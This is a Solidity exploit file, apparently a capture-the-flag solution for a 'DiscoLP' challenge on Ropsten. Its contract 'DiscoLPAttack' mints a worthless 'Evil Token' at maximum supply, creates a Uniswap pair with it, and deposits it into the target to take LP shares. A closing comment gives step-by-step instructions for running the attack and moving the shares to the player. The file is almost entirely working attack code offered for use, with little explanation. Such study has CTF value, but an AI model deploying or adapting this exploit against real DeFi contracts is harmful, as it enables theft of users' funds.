pragma solidity >=0.6.5;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/ERC20.sol";

interface IDiscoLP {
     function depositToken(address _token, uint256 _amount, uint256 _minShares) external;
     function balanceOf(address from) external returns (uint256);
     function approve(address spender, uint256 amount) external returns (bool);
     function transfer(address recipient, uint256 amount) external returns (bool);
}

contract Token is ERC20 {
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public {
        _mint(msg.sender, 2**256 - 1);
    }
}


library $ {
  address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten
  address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten
}

interface IUniswapV2Factory {
  event PairCreated(address indexed token0, address indexed token1, address pair, uint);

  function getPair(address tokenA, address tokenB) external view returns (address pair);
  function allPairs(uint) external view returns (address pair);
  function allPairsLength() external view returns (uint);

  function feeTo() external view returns (address);
  function feeToSetter() external view returns (address);

  function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router {
	function WETH() external pure returns (address _token);
	function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);
	function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);
	function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);
	function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);
	function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);
}

interface IPair {
	function token0() external view returns (address _token0);
	function token1() external view returns (address _token1);
	function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);
	function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);
	function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
	function mint(address _to) external returns (uint256 _liquidity);
	function sync() external;
}

contract DiscoLPAttack {
    
    function getToken0(address pair) public view returns(address) {
        return IPair(pair).token0();
    }
    
    function atttack(address instance, uint256 amount, address tokenA) public payable {
        address _factory = $.UniswapV2_FACTORY;
        address _router = $.UniswapV2_ROUTER02;
        
        ERC20 evilToken = new Token("Evil Token", "EVIL");
        
        address pair = IUniswapV2Factory(_factory).createPair(address(evilToken), address(tokenA));
        evilToken.approve(instance, uint256(-1));
        evilToken.approve(_router, uint256(-1));
        IERC20(tokenA).approve(_router, uint256(-1));
        
        (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(
          address(evilToken),
          address(tokenA),
          1000000 * 10 ** 18,
          1 * 10 ** 18,
          1, 1, address(this), uint256(-1));
          
        
        IDiscoLP(instance).depositToken(address(evilToken), amount, 1);
    }
    
    function transferDiscoLP2Player(address instance, address player) public payable {
        uint256 balance = IDiscoLP(instance).balanceOf(address(this));
        IDiscoLP(instance).approve(address(this), uint256(-1));
        IDiscoLP(instance).transfer(player, balance);
    }
}


/**
 *  step1: get reserveToken() from instance
 *  step2: deploy attack contract
 *  step3: get token0 on pair attack.getToken0(reserveToken)
 *  step4: token0.transfer(attack contract, 1 * 10 ** 18)
 *         Token contract At Address in remix then transfer
 *  step5: attack contract attack(instance, 1000000 * 10 ** 18, token0)
 *  step6: transferDiscoLP2Player(instance, player)
 *  step7: in DiscoLP balanceOf(player)
 **/
